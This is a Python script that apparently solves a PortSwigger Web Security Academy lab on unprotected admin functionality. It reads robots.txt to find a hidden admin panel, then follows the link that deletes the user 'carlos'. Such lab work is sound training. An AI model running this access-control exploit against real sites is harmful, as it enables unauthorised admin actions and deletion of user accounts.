# Unprotected admin functionality
# https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

import requests
from bs4 import BeautifulSoup

site = "https://0a1400db0380c858c0b10c0300da00e4.web-security-academy.net/"
s = requests.Session()

if 'https://' in site:
  site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/robots.txt'
resp = s.get(url)

match_line = [line for line in resp.text.split('\n') if 'admin' in line]
uri = match_line[0].split(' ')[1]

input(f'uri of admin panel from robots.txt is {url} ')

url = f'https://{site}{uri}'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]
delete_uri = carlos_delete_link[0]['href']

input(f'Carlos delete link is {delete_uri}, retrieve it: ')
url = f'https://{site}{delete_uri}'
resp = s.get(url)

print(resp.text)